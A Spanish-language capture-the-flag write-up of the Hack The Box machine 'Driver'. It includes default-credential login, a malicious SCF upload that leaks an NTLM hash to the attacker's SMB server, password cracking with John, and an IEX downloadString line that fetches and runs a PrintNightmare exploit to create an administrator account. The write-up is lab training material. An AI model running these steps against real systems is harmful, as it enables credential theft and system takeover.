## Summary

Tags: #SMB #SCF #John #Hash #Windows #WinRM #WinPEAS #Nmap 

- IP -> 10.10.11.106
- Ports -> TCP (445, 80, 135,5985), UDP (idk)
- OS ->  Windows
- Services & Applications
    - 80 -> Microsoft IIS httpd 10.0
    - 135 -> Microsoft Windows RPC
    - 445 -> SMB
    - 5985 -> WinRM

## Recon
```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```
No encontramos nada relevante

```bash
❯ smbclient -L ❮IP❯                   # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
```
Acceso denegado

```bash
❯ smbmap -H ❮IP❯                      # Herramienta elternativa para ver si nos reporta algo mas y nos reporta los permisos (WRITE, READ)
```
Acceso denegado

```bash
❯ crackmapexec smb ❮IP❯               # Para listar recursos compartidos de Windows
```
No esta firmado, SMBv1, name:DRIVER, domain:DRIVER

* Al momento de entrar a la web. Nos pide una autenticacion, por lo que ponemos el user y passwd por defaul -> admin:admin y logramos entrar.

Wappalyzer:
* IIS 10.0 - Web Servers
* PHP 7.3.25 -Programming Languaje
* JQuery 3.2.1 - JavaScript Libraries

En la parte de Firmware podemos cargar un archivo.  Por lo que estamos frente a un **SCF (Shell Comand Files) File Attack** y lo buscamos en Google. 
* [SCF_File_Attacks](https://nored0x.github.io/red-teaming/smb-share-scf-file-attacks/)

Y haremos el siguiente:
```bash
❯ nano file.scf
	[shell]
	Command=2
	IconFile=\\10.10.14.13\smbFolder\test.ico    # Colocamos nuestra IP ,el recurso que vamos a compartir se llama 'smbFolder' y se cargara un icono aunque no exista
	[Taskbar]
	Command=ToggleDesktop
```

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un servicio con SMB 

	# smbFolder = Nos creara un servicio compartido llamado 'smbFolder'
	# pwd = Sincronizado con la ruta absoluta actual 
	# smb2support = En Windows 10 le damos soporte a la version 2
```

Suponiendo que se esta haciendo una autenticacion por detras, despues de subir el archivo y darle 'Submit'. Podemos observar en nuestra consola que hay un usuario llamado **'Tony' con su hash.**

Creamos un archivo que contenga el hash para despues poder usar John y asi crackearlo
```bash
❯ nvim hash
	tony::DRIVER:aaaaaaaa....
```

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt <Hashfile>                              # Usamos John para crackear un hash con fuerza bruta

	# wordlist = Ruta del diccionario rockyou.txt
	# hashfile = Archivo que contiene el hash a crackear
```
Nos devuelve una **passwd=liltony**

```bash
❯ crackmapexec smb ❮IP❯ -u ❮‘user’❯ -p ❮‘password’❯      # Para el servicio 445/tcp smb abierto podemos utilizar el siguiente comando para saber si tenemos credenciales validas, por lo que si nos muestra un (+) quiere decir que si son validas, ademas de que nos da informacion de lo que hay en ese servico (nombre, Window 10.0, dominio, signing=true)(u=user, p=password) Este comando es usado para validar aunque tenga mas aplicaciones.

❯ crackmapexec winrm ❮IP❯ -u ❮‘user’❯ -p ❮‘password’❯    # Despues de saber que las credenciales son validas con crackmapexec, podemos utilizar el puerto de winrm para saber si podemos entrar, pero antes debemos saber si el usuario esta en el grupo Remote management users, para saber si pertenece nos debe poner un (Pwn3d!) y asi podernos autenticar.

# Podemos usar evil-winrm para conectarnos, si tiene el puerto 5985 abierto
```

## User
Como tambien tenemos el puerto 5985 OPEN, nos podemos conectar por evil-winrm
```bash
❯ evil-winrm -i ❮IP❯ -u ❮‘user’❯ -p ❮‘password’❯         # Nos podemos conectar ya al servicio de administracion remota de Windows
```
Entramos a la maquina 

```bash
❯ ipconfig                                   # Nos muestra las interfaces y las direcciones IP
```

```bash
❯ whoami                                     # Miramos el nombre del usuario
```

```bash
❯ net user ❮User❯                            # Para ver los grupos locales y el RMU
```

```bash
❯ type ❮File❯                                # Nos muestra el contenido del archivo
```
Miramos el contenido de la flag user.txt en el Desktop

## Root

```bash
❯  whoami /priv                              # Miramos los privilegios que tenemos   
	
	# SetInpersonatePrivilege = En el cual podriamos usar RottenPotato o  JuicyPotato 
	# SetLoadPrivilege = Para usar el recurso de Tarlogic

❯  whoami /all                               # Miramos todos los privilegios
```
Pero no encontramos nada que nos ayude a escalar

Para poder escalar usaremos **WinPEAS** y lo descargaremos en la maquina de atacante, para despues subirlo a la maquina victima
* [WinPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md) 
Nos dirigimos a: Download the **latest obfuscated and not obfuscated versions from here**, -> Despues debemos de descargar el archivo **winPeasx64.exe** esto en la maquina de atacante Linux

```bash
C:\Windows\Temp                              # Directorios con capacidad de escritura en Windows
```

Este comando se ejecuta en la maquina Windows
```bash
❯ upload /home/omar/Downloads/Firefox/winpeasx64.exe # Subimos el archivo WinPEAS a la maquina victima, colocando la ruta absoluta de la maquina de atacante en donde se encuentra
```

```bash
❯.\winpeasx64.exe   # Ejecutamos el binario en la maquina victima, y recolectara informacion para ver las vilnerabilidadses y poder escalar privilegios.
```

Encontrams que tiene una vulnerabilidad con Spoolsv, por lo que buscamos en Google como poder explotarla
* [Spoolsv-PrintNightmare LPE (PowerShell)](https://github.com/calebstewart/CVE-2021-1675)
Nos dirigimos dentro a CVE-2021-1675.ps1 y despues a Raw para poderlo clonar en la maquina de atacante Linux
```bash
❯ wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1   # Nos descargamos el binario a nuestra maquina de atacante
```

```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para pasar el binario
```

En la maquina Windows hacemos lo siguiente para subir el archivo
```bash
❯ IEX(New-Object Net.WebClient).downloadString(‘http://10.10.14.13/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor
```

Ahora podremos crear un usuario con los privilegios NT/AuthoritySystem
```bash
❯ Invoke-Nightmare -Drivername “Xerox” -NewUser “Omar” -NewPassword “Omar123$!” # Aqui crearemos un .dll en donde pondra nuestro usuario como administrador.
```

```bash
❯ net user                  # Verificamos los usuarios y miramos que ya tenemos asignado nuestro usuario como administrador
```
 
Despues de eso volvemos a verificar con crackmapexec y buscaremos que nos ponga un pwn3d y con eso verificaremos que nos podremos conectar con evilwinrm para que nos de una consola de Administrator
```bash
❯ crackmapexec winrm 10.10.11.106 -u ‘Omar’ -p ‘Omar123$!’ # Aqui veremos si nos pone un pwned y si es asi es porque el usuario normalmente esta en un directorio que se llama 'Remote Management User'.
```
  
```bash
❯ evil-winrm -i 10.10.11.106 -u ‘Omar’ -p ‘Omar123$!’      # Nos podemos conectar ya al servicio de administracion remota de Windows como el usuario Tony
```
  
Una vez adentro buscamos la flag root.txt